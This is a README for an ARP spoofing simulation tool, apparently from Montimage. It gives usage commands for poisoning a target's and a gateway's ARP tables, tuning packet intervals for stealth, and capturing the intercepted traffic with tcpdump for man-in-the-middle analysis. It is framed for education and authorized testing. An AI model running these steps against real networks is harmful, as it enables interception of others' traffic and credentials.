# ARP Spoofing Attack Simulation

## Overview

ARP spoofing (also known as ARP poisoning) is a type of attack where an attacker sends falsified ARP messages over a local network. This results in linking the attacker's MAC address with the IP address of a legitimate computer or server on the network, allowing the attacker to intercept, modify, or stop data in transit.

This script simulates an ARP spoofing attack for educational and authorized security testing purposes.

## Features

- Spoofing ARP tables of target systems
- Enabling IP forwarding for traffic interception
- Customizable packet sending intervals
- Detailed logging and statistics
- Graceful shutdown with ARP table restoration

## Requirements

- Python 3.6+
- Scapy library
- Root/Administrator privileges (required for packet manipulation)

## Installation

```bash
# Install required dependencies
pip install scapy
```

## Usage

### Basic Attack

The simplest way to run an ARP spoofing attack is to specify a target IP and the gateway IP:

```bash
sudo python arp_spoof.py -t 192.168.1.10 -g 192.168.1.1
```

This will:
- Spoof the ARP tables of both the target (192.168.1.10) and the gateway (192.168.1.1)
- Use the default packet interval of 1 second
- Enable IP forwarding to allow traffic to pass through your machine

### Customizing the Attack

#### Specify a Network Interface

If your system has multiple network interfaces, you can specify which one to use:

```bash
sudo python arp_spoof.py -t 192.168.1.10 -g 192.168.1.1 -i eth0
```

#### Adjust Packet Interval

To make the attack more stealthy or aggressive, you can adjust the interval between packets:

```bash
# More aggressive (0.5 second interval)
sudo python arp_spoof.py -t 192.168.1.10 -g 192.168.1.1 -n 0.5

# More stealthy (3 second interval)
sudo python arp_spoof.py -t 192.168.1.10 -g 192.168.1.1 -n 3
```

#### Enable Verbose Mode

For detailed output and debugging information:

```bash
sudo python arp_spoof.py -t 192.168.1.10 -g 192.168.1.1 -v
```

## Advanced Usage

### Man-in-the-Middle Setup

To effectively use ARP spoofing for a man-in-the-middle attack, you'll need to:

1. Enable IP forwarding (the script does this automatically)
2. Set up a packet sniffer to capture the traffic
3. Optionally, use a tool like Wireshark to analyze the captured traffic

Example with tcpdump to capture traffic:

```bash
# In one terminal, start the ARP spoofing
sudo python arp_spoof.py -t 192.168.1.10 -g 192.168.1.1

# In another terminal, capture the traffic
sudo tcpdump -i eth0 -w captured_traffic.pcap host 192.168.1.10
```

## Ethical Considerations

This tool should ONLY be used for:
- Educational purposes
- Authorized security testing
- Network troubleshooting

Unauthorized use against systems without explicit permission is illegal and unethical.

## Troubleshooting

### Common Issues

1. **Permission Denied**: You need root/administrator privileges to send raw packets
   ```
   sudo python arp_spoof.py -t 192.168.1.10 -g 192.168.1.1
   ```

2. **Interface Not Found**: Verify your network interface name
   ```
   ifconfig  # On Linux/Mac
   ipconfig  # On Windows
   ```

3. **Target Not Responding**: Ensure the target is online
   ```
   ping 192.168.1.10
   ```

## Command Line Options

```
-t, --target      Target IP address (required)
-g, --gateway     Gateway IP address (required)
-i, --interface   Network interface to use (default: auto-detect)
-n, --interval    Time interval between ARP packets in seconds (default: 1.0)
-v, --verbose     Enable verbose output
```

## License

Proprietary - Montimage
